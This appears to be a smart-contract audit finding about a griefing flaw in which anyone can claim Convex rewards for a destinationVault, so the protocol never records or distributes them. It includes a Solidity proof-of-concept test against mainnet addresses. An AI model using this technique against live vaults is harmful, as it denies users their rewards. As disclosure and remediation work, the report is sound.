# A malicious user can prevent rewards from being distributed for a Convex `destinationVault`.
## Summary

## Vulnerability Detail
The `Liquidator` will call `collectRewards` on the `destinationVault` to receive the accumulated rewards, record the rewards received, and distribute them to the users.

However, Convex can claim rewards on behalf of any user. 
(https://github.com/convex-eth/platform/blob/main/contracts/contracts/BaseRewardPool.sol#L263)

Therefore, if an arbitrary user claims a reward in `destinationVault`, even if it is not through Liquidator's `collectRewards`, the reward received in `destinationVault` will not be recorded and distributed to users.

This prevents reward distribution, a key feature of the protocol, from happening.

POC:
```solidity
    function test_ETHfrxETH_pool1() public {
        address curveLp = 0xf43211935C781D5ca1a41d2041F397B8A7366C7A;
        address curveLpWhale = 0x1577671a75855a3Ffc87a3E7cba597BD5560f149;
        address gauge = 0xbD5445402B0a287cbC77cb67B2a52e2FC635dce4;

        deal(curveLp, curveLpWhale, 1000 ether);
        transferCurveLpTokenAndDepositToConvex(curveLp, gauge, curveLpWhale);

        vm.prank(address(0xbad));
        gauge.call(
            abi.encodeWithSignature("getReward(address,bool)", address(this), true)
        );

        (uint256[] memory amountsClaimed, address[] memory rewardsToken) =
            ConvexRewards.claimRewards(gauge, CVX_MAINNET);

        assertEq(amountsClaimed.length, rewardsToken.length);
        assertEq(rewardsToken.length, 2);
        assertEq(address(rewardsToken[0]), CRV_MAINNET);
        assertTrue(amountsClaimed[0] > 0);
        assertEq(address(rewardsToken[1]), CVX_MAINNET);
        assertTrue(amountsClaimed[1] > 0);
    }
```

## Impact
A malicious user can prevent rewards from being distributed for a Convex `destinationVault`.

## Tool used

Manual Review

## Recommendation
It is recommended to understand the amount of rewards claimed compared to the previous snapshot, not the amount generated by the return value of the `claimRewards` function.
